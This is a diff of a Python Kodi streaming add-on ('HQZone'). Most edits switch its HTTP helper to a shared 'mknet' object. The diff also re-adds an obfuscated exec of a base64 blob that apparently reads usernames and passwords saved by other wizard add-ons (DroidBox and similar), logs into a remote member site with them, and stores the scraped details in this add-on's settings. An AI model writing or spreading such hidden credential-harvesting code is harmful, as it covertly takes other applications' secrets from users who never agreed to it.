@@ -1,5 +1,4 @@
-import base64,urllib,urllib2,re,cookielib,string,os,xbmc, xbmcgui, xbmcaddon, xbmcplugin, random, datetime,urlparse
-from t0mm0.common.net import Net as net
+import base64,urllib,urllib2,re,cookielib,string,os,xbmc, xbmcgui, xbmcaddon, xbmcplugin, random, datetime,urlparse,mknet
 
 addon_id        = 'plugin.video.HQZone'
 selfAddon       = xbmcaddon.Addon(id=addon_id)
@@ -9,13 +8,14 @@ icon            = xbmc.translatePath(os.path.join('special://home/addons/' + add
 user            = selfAddon.getSetting('hqusername')
 passw           = selfAddon.getSetting('hqpassword')
 cookie_file     = os.path.join(os.path.join(datapath,''), 'hqzone.lwp')
-    
-exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MTkgMWUgPT0gJycgNTggMjMgPT0gJycgNTggMWUgPT0gJzNiJzoKCTE5IDRhLjJmLjM4KDIpOgoJCTRhLjVhKDIpCgk2ZToKCQkxYyA9IFsnMWIuMjIuNDUnLCAnMWIuMjIuZCcsICcxYi4yMi4zNCddCgkJNTkgMWEgM2YgMWM6CgkJCWIgPSAzNS4yYig0YS4yZi42NignNGY6Ly82My80Yy80MC8nKzFhLCAnNDguNmInKSkKCQkJMTkgNGEuMmYuMzgoYik6CgkJCQkyZCA9IDYxKGIsICc2NycpCgkJCQkxOCA9IDJkLjY5KCkKCQkJCTI2ID0gMzkuYygnPDI1IDQ3PSI0MSIgZT0iKC4rPykiJykuNCgxOClbMF0KCQkJCTI4ID0gMzkuYygnPDI1IDQ3PSIzZCIgZT0iKC4rPykiJykuNCgxOClbMF0KCQkJCTE5ICdkJyAzZiAxYToKCQkJCQk2OCA9ICcxZDovLzMxLjIwLjQ0LjVmLzMzJwoJCQkJCTczID0gJzFkOi8vMzEuMjAuNDQuNWYvNS9mLzQ3LzMvJwoJCQkJNDY6CgkJCQkJNjggPSAnMWQ6Ly8yMS40NC8yOS8zMycKCQkJCQk3MyA9ICcxZDovLzIxLjQ0LzI5LzUvZi80Ny84LycKCQkJCTNlIDY4CgkJCQkzZSA3MwoJCQkJNDMgPSAxMigpLjkoNjgpLjUKCQkJCTY3ID0gMzkuNCg2Nyc8NWMgNjU9IjUxIiAzNz0iKC4rPykiIGU9IiguKz8pIiAvPicsIDQzLCAzOS43NSkKCQkJCTc0ID0ge30KCQkJCTc0WycyYyddID0gMjYKCQkJCTc0WyczMCddID0gMjgKCQkJCTU5IDM3LCBlIDNmIDY3OgoJCQkJCTc0WzM3XSA9IGUKCQkJCQkxMigpLjkoNjgpCgkJCQkJMTIoKS40Mig2OCw3NCkKCQkJCQkxMigpLjJlKDIpCgkJCQkJMTIoKS4zYSgyKQoJCQkJCTc3ID0gMTIoKS45KDY4KQoJCTE5ICc1MiAzZiA3MCcgM2YgNzcuNToKCQkJCTc3ID0gMTIoKS45KDczKQoJCQkJMzYgPSA3Ny41CgkJCQkxZT0zOS5jKCc8Nz4oLis/KTwvNz4nKS40KDM2KVswXQoJCQkJMjM9MzkuYygnPDY+KC4rPyk8LzY+JykuNCgzNilbMF0KCTU0OgoJCTMyID0gNTAuNTUoKQoJCTU2ID0gMzIuNWUoJzE3JywgJzU3IDVkIDZhIDE3IDI0IDRlJywnNTggNDkgMTkgNmQgNjIgNjAgNzIgMjQnLCc3MSA2Yy4xNy42ZicsJzUzJywnNWInKQoJCTE5IDU2ID09IDE6CgkJCWEgPSAzNS4xZignJywgJzNjIDRkJykKCQkJYS4yNygpCgkJCTE5IChhLjExKCkpOgoJCQkJMTAgPSBhLjJhKCkKCQkJCTc9MTAKCQkJCWEgPSAzNS4xZignJywgJzNjIDRiOicpCgkJCQlhLjI3KCkKCQkJCTE5IChhLjExKCkpOgoJCQkJICAgMTAgPSBhLjJhKCkKCQkJCSAgIDY9MTAKCQkJCSAgIDc2LjE0KCcxMycsNykKCQkJCSAgIDc2LjE0KCcxNicsNikKCQk0Njo2NCgpCgkJMWUgPSA3Ni4xNSgnMTMnKQoJCTIzID0gNzYuMTUoJzE2Jyk=")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|cookie_file|3|findall|content|password|username|8|http_GET|keyb|wizardpath|compile|droidboxwizard|value|f|search|isConfirmed|net|hqusername|setSetting|getSetting|hqpassword|HQZone|wizlog|if|addons|plugin|AddonList|http|user|Keyboard|droidbox|dswizard|video|passw|account|setting|wizuser|doModal|wizpass|amember|getText|translatePath|amember_login|wizset|save_cookies|path|amember_pass|wizard|dialog|member|UpdateWizard|xbmc|link|name|exists|re|set_cookies|Droidsticks|Enter|dspassword|print|in|addon_data|dsusername|http_POST|html|co|aswizard|else|id|settings|register|os|Password|userdata|Username|details|special|xbmcgui|hidden|Logged|Cancel|except|Dialog|ret|Please|or|for|remove|Login|input|enter|yesno|uk|have|open|dont|home|quit|type|join|r|amemberurl|read|your|xml|www|you|try|Tv|as|at|an|hqpass|post_data|I|selfAddon|response".split("|")))
+net             = mknet.Net()
+
+exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MWMgMWQgPT0gJycgNTEgMjMgPT0gJycgNTEgMWQgPT0gJzNhJzoKCTFjIDQzLjM5LjMxKDIpOgoJCTQzLjU0KDIpCgk2YzoKCQkxOSA9IFsnMTguMjIuNDcnLCAnMTguMjIuYycsICcxOC4yMi4zNCddCgkJNTcgMTcgNDAgMTk6CgkJCWIgPSAzMi4yYyg0My4zOS42NygnNGQ6Ly82OS80YS8zZC8nKzE3LCAnNGIuNmEnKSkKCQkJMWMgNDMuMzkuMzEoYik6CgkJCQkzMyA9IDYyKGIsICc2NScpCgkJCQkxYSA9IDMzLjY2KCkKCQkJCTI0ID0gMzAuZCgnPDI2IDQ4PSIzZSIgZT0iKC4rPykiJykuNSgxYSlbMF0KCQkJCTI3ID0gMzAuZCgnPDI2IDQ4PSIzYyIgZT0iKC4rPykiJykuNSgxYSlbMF0KCQkJCTFjICdjJyA0MCAxNzoKCQkJCQk1ZSA9ICcyMDovLzM1LjFlLjQ1LjY0LzM3JwoJCQkJCTE2ID0gJzIwOi8vMzUuMWUuNDUuNjQvNC9mLzQ4LzMvJwoJCQkJNDQ6CgkJCQkJNWUgPSAnMjA6Ly8yMS40NS8yOS8zNycKCQkJCQkxNiA9ICcyMDovLzIxLjQ1LzI5LzQvZi80OC84LycKCQkJCTQyID0gMTEuOSg1ZSkuNAoJCQkJNjUgPSAzMC41KDY1Jzw1YSA2MT0iNTYiIDM2PSIoLis/KSIgZT0iKC4rPykiIC8+JywgNDIsIDMwLjc1KQoJCQkJNzQgPSB7fQoJCQkJNzRbJzJiJ10gPSAyNAoJCQkJNzRbJzM4J10gPSAyNwoJCQkJNTcgMzYsIGUgNDAgNjU6CgkJCQkJNzRbMzZdID0gZQoJCQkJCTExLjkoNWUpCgkJCQkJMTEuNDEoNWUsNzQpCgkJCQkJMTEuMmYoMikKCQkJCQkxMS4zYigyKQoJCQkJCTYgPSAxMS45KDVlKQoJCTFjICc1MCA0MCA3MicgNDAgNi40OgoJCQkJNiA9IDExLjkoMTYpCgkJCQkyZSA9IDYuNAoJCQkJMWQ9MzAuZCgnPDc+KC4rPyk8Lzc+JykuNSgyZSlbMF0KCQkJCTIzPTMwLmQoJzw3Mz4oLis/KTwvNzM+JykuNSgyZSlbMF0KCTU1OgoJCTJkID0gNGYuNTIoKQoJCTU4ID0gMmQuNWIoJzFiJywgJzUzIDVkIDVmIDFiIDI1IDRlJywnNTEgNDYgMWMgNmQgNjAgNjggNmUgMjUnLCc3MCA2Yi4xYi43MScsJzU5JywnNWMnKQoJCTFjIDU4ID09IDE6CgkJCWEgPSAzMi4xZignJywgJzNmIDRjJykKCQkJYS4yYSgpCgkJCTFjIChhLjEwKCkpOgoJCQkJNmYgPSBhLjI4KCkKCQkJCTc9NmYKCQkJCWEgPSAzMi4xZignJywgJzNmIDQ5OicpCgkJCQlhLjJhKCkKCQkJCTFjIChhLjEwKCkpOgoJCQkJICAgNmYgPSBhLjI4KCkKCQkJCSAgIDczPTZmCgkJCQkgICA3Ni4xNSgnMTMnLDcpCgkJCQkgICA3Ni4xNSgnMTInLDczKQoJCTQ0OjYzKCkKCQkxZCA9IDc2LjE0KCcxMycpCgkJMjMgPSA3Ni4xNCgnMTInKQ==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|cookie_file|3|content|findall|response|username|8|http_GET|keyb|wizardpath|droidboxwizard|compile|value|f|isConfirmed|net|hqpassword|hqusername|getSetting|setSetting|hqpass|addons|plugin|AddonList|wizlog|HQZone|if|user|droidbox|Keyboard|http|dswizard|video|passw|wizuser|account|setting|wizpass|getText|amember|doModal|amember_login|translatePath|dialog|link|save_cookies|re|exists|xbmc|wizset|UpdateWizard|wizard|name|member|amember_pass|path|Droidsticks|set_cookies|dspassword|addon_data|dsusername|Enter|in|http_POST|html|os|else|co|register|aswizard|id|Password|userdata|settings|Username|special|details|xbmcgui|Logged|or|Dialog|Please|remove|except|hidden|for|ret|Cancel|input|yesno|Login|enter|amemberurl|your|dont|type|open|quit|uk|r|read|join|have|home|xml|www|try|you|an|search|at|Tv|as|password|post_data|I|selfAddon".split("|")))
       
 #############################################################################################################################
 def announce():
     try:
-        response = net().http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
+        response = net.http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
         link = response.content
         link=link.replace('\n','')
         match=re.compile('<titlepop>(.+?)</titlepop>.+?<line1>(.+?)</line1>.+?<line2>(.+?)</line2>.+?<line3>(.+?)</line3>').findall(link)
@@ -28,7 +28,7 @@ def Index():
     deletecachefiles()
     announce()
     setCookie('http://rarehost.net/site/member')
-    response = net().http_GET('http://rarehost.net/site/member')
+    response = net.http_GET('http://rarehost.net/site/member')
     if not 'Logged in as' in response.content:
         dialog = xbmcgui.Dialog()
         dialog.ok('HQZone', 'Login Error','An error ocurred logging in. Please check your details','Ensure your account is active on http://hqzone.tv')
@@ -50,14 +50,14 @@ def Index():
     addLink('HQZone Account Status','url',200,icon,fanart)
     addDir('HQ Zone Support','url',300,icon,fanart)
     addLink(' ','url',5,icon,fanart)
-    response = net().http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
+    response = net.http_GET('http://pastebin.com/raw.php?i=Jp76gEmp')
     link = response.content
     ticker=re.compile('<ticker>(.+?)</ticker>').findall(link)[0]
     addLink('[COLOR red][I]'+ ticker +'[/I][/COLOR]','url','mode',icon,fanart)
     xbmc.executebuiltin('Container.SetViewMode(50)')
 
 def luckydip(url):
-    response = net().http_GET(url)
+    response = net.http_GET(url)
     link = response.content
     link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
     match=re.compile('<title>(.+?)</title><link>(.+?)</link>').findall(link)
@@ -98,7 +98,7 @@ def getchannels(url):
         vip = 1
     else:baseurl = 'http://rarehost.net/site/free/'
     setCookie('http://rarehost.net/site/member')
-    response = net().http_GET(url)
+    response = net.http_GET(url)
     link = response.content
     link = cleanHex(link)
     link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
@@ -129,7 +129,7 @@ def getchannels(url):
 
 def getstreams(url,name):
     setCookie('http://rarehost.net/site/member')
-    response = net().http_GET(url)
+    response = net.http_GET(url)
     link = response.content
     link = cleanHex(link)
     link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
@@ -147,20 +147,20 @@ def getstreams(url,name):
     
 
 def setCookie(srDomain):
-    html = net().http_GET(srDomain).content
+    html = net.http_GET(srDomain).content
     r = re.findall(r'<input type="hidden" name="(.+?)" value="(.+?)" />', html, re.I)
     post_data = {}
     post_data['amember_login'] = user
     post_data['amember_pass'] = passw
     for name, value in r:
         post_data[name] = value
-    net().http_GET('http://rarehost.net/site/member')
-    net().http_POST('http://rarehost.net/site/member',post_data)
-    net().save_cookies(cookie_file)
-    net().set_cookies(cookie_file)
+    net.http_GET('http://rarehost.net/site/member')
+    net.http_POST('http://rarehost.net/site/member',post_data)
+    net.save_cookies(cookie_file)
+    net.set_cookies(cookie_file)
 
 def schedule(url):
-    response = net().http_GET(url)
+    response = net.http_GET(url)
     link = response.content
     link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
     match=re.findall('<h3><span class=".+?">(.+?)</span><span class="daynum" style=".+?" onclick=".+?">(.+?)</span></h3><ul class="blockrow eventlist">(.+?)</ul>',link)
@@ -175,7 +175,7 @@ def schedule(url):
     xbmc.executebuiltin('Container.SetViewMode(51)')
   
 def todayschedule(url):
-    response = net().http_GET(url)
+    response = net.http_GET(url)
     link = response.content
     match=re.compile('<li><a href=".+?">(.+?)</a>.+?</li>').findall(link)
     now = str(datetime.datetime.now().date())
@@ -189,7 +189,7 @@ def todayschedule(url):
 
 def account():
     setCookie('http://rarehost.net/site/member')
-    response = net().http_GET('http://rarehost.net/site/member')
+    response = net.http_GET('http://rarehost.net/site/member')
     link = response.content
     link = cleanHex(link)
     link=link.replace('\r','').replace('\n','').replace('\t','').replace('&nbsp;','').replace('  ','')
@@ -220,14 +220,14 @@ def vod():
     
 def vodlisting(name,url):
     setCookie('http://rarehost.net/site/member')
-    response = net().http_GET(url)
+    response = net.http_GET(url)
     link = response.content
     link = cleanHex(link)
     match=re.compile("playlist: '(.+?)'").findall(link)[0]
     if 'Weeklies' in name:url='http://rarehost.net/site/free/'+match
     else:url = 'http://rarehost.net/site/vip/'+match
     setCookie('http://rarehost.net/site/meember')
-    response = net().http_GET(url)
+    response = net.http_GET(url)
     link = response.content
     link = cleanHex(link)
     match=re.compile('<title>(.+?)</title>.+?source file="(.+?)"',re.DOTALL).findall(link)
@@ -349,7 +349,7 @@ def showText(heading, text):
 def twitter():
         text = ''
         twit = 'https://script.google.com/macros/s/AKfycbyBcUa5TlEQudk6Y_0o0ZubnmhGL_-b7Up8kQt11xgVwz3ErTo/exec?560773938943627264'
-        response = net().http_GET(twit)
+        response = net.http_GET(twit)
         link = response.content
         link = link.replace('/n','')
         link = link.encode('ascii', 'ignore').decode('ascii').decode('ascii').replace('&#39;','\'').replace('&#xA0;','').replace('&#x2026;','')
